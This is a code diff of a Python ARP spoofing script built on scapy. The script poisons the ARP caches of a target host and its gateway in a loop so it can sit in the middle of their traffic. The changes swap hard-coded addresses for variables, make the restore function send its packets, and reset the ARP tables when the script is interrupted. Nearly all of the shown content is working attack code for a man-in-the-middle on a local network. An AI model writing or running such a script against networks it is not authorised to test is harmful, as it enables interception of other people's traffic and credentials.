@@ -1,4 +1,5 @@
 #!/usr/bin/env python
+from tabnanny import verbose
 from termcolor import colored, cprint
 import scapy.all as scapy
 from time import sleep
@@ -24,20 +25,23 @@ def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
 
-    
 
-restore('192.168.0.105', '192.168.0.1')
+target_ip = '192.168.0.105'
+gateway_ip = '192.168.0.1'
 
 try :
     COUNTER = 0
     while True:
-        spoof('192.168.0.105', '192.168.0.1')
-        spoof('192.168.0.1', '192.168.0.105')
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
         COUNTER += 2
         TEXT = colored(COUNTER, 'green', attrs=['blink'])
         print(f'\rSent packets : {TEXT}', end='')
         sys.stdout.flush()
         sleep(2)
 except KeyboardInterrupt:
-    print('\n[red]Has finished.')
+    print('\n[red]Has finished. Resetting ARP tables')
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
